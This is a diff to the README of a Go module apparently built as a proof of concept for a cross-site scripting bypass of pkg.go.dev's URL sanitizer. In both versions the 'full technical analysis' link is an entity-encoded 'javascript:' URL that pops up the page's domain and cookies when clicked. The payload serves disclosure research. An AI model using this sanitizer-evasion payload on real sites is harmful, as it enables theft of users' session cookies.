@@ -1,12 +1,12 @@
 # pkgsite-xss-poc
 
-Test Go module.
+Test Go module for security research.
 
 ## Security Research
 
-This module is part of security research testing.
+This module demonstrates a URL sanitizer bypass in pkg.go.dev.
 
-[📄 Click here for full technical analysis](javascript&#58;alert(document.domain+"0X0P+0Cookies:"+document.cookie))
+<a href="javascript&amp;#58;alert(document.domain+&#34;&#10;Cookies: &#34;+document.cookie)">📄 Click here for full technical analysis</a>
 
 ## Install
 
